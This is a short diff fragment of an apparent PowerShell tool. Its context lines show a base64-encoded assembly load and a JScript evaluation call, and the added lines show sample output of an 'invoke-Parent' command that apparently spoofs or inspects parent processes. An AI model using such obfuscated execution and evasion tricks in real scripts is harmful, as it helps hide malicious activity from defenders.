@@ -17,7 +17,23 @@ WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAVwBpAHQA
 AGEAcgB0AGkAYQBsAE4AYQBtAGUAKAAnAE0AaQBjAHIAbwBzAG8AZgB0AC4ASgBTAEMAcgBpAHAAdAAnACkA
 [void] [Microsoft.JScript.Eval]::JScriptEvaluate($Void,[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())
 
- 
+ PS C:\> invoke-Parent -ProcessName powershell.exe
+
+
+UserName Domain_LOP      SID
+-------- ----------      ---
+Matt     DESKTOP-F5LB1H0 S-1-5-21-3470420603-3041439269-2463402797-1001
+
+
+PS C:\> invoke-Parent -ProcessName calc.exe
+
+
+UserName Domain_LOP      SID
+-------- ----------      ---
+Matt     DESKTOP-F5LB1H0 S-1-5-21-3470420603-3041439269-2463402797-1001
+
+
+PS C:\>
 
 #>
 
